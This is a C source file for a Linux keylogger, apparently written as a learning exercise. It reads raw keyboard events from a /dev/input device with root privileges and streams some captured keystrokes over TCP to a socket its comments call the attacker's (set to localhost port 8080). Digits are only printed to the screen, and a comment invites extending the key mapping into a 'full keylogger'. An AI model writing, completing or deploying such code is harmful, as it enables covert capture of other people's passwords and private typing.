/*

use the keyboard event file in /dev/
take argument

cannot use fopen or fread to read events because of blocking behavior
use sys functions provided by kernel to read keyboard events (documentation for system functions are found in man 2), check man syscalls

Buffer to allocate is the input_event struct in header linux/input.h https://stackoverflow.com/questions/21204798/read-in-linux-for-event-file

open() returns int file descriptor

https://www.kernel.org/doc/html/v5.4/input/event-codes.html

must flush stream to avoid buffering, use fflush()

(TCP)

*/

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <strings.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

// attacker's socket
#define IP "127.0.0.1"
#define PORT 8080

int tcp_connect(int *socket_fd);
void print(int fd, int socket_fd);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Eventfile argument required\n");
        return 1;
    }

    int fd = open(argv[1], O_RDONLY, 0);

    if (fd < 0) {
        fprintf(stderr, "Must run with root privileges\n");
        return 1;
    }

    // open socket

    int socket_fd = -1;
    if (tcp_connect(&socket_fd) != 0) {
        return 1;
    }

    // print
    print(fd, socket_fd);

    close(socket_fd);
    return 0;
}

int tcp_connect(int *socket_fd) {
    // create socket fd
    *socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (*socket_fd < 0) {
        fprintf(stderr, "Error creating socket\n");
        return 1;
    }
    // fill struct
    struct sockaddr_in server;
    bzero(&server, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);
    // connect socket fd to address described in sockaddr_in struct
    if (connect(*socket_fd, (struct sockaddr *)&server, sizeof(server)) != 0) {
        perror("Could not connect\n");
        close(*socket_fd);
        return 1;
    }
    fprintf(stdout, "Connetion succeeded\n");
    return 0;
}

void print(int fd, int socket_fd) {

    struct input_event ie;

    for (;;) {
        read(fd, &ie, sizeof(ie));

        if (ie.type != EV_KEY)
            continue;
        if (ie.value != 1)
            continue;

        if (ie.code >= 2 && ie.code <= 10) {
            printf("%d", ie.code - 1);
        } else if (ie.code == 11) {
            printf("0");
        } else {
            switch (ie.code) {
                case KEY_Q:
                    send(socket_fd, "q", 1, 0);
                    break;
                case KEY_SPACE:
                    send(socket_fd, " ", 1, 0);
                    break;
                case KEY_BACKSPACE:
                    send(socket_fd, "(backspace)", 11, 0);
                    break;
                // add more case statements for full keylogger
                default:
                    printf("Unknown key: %d\n", ie.code);
            }
        }
        // fflush(stdout); not necessary for send()
    }
}
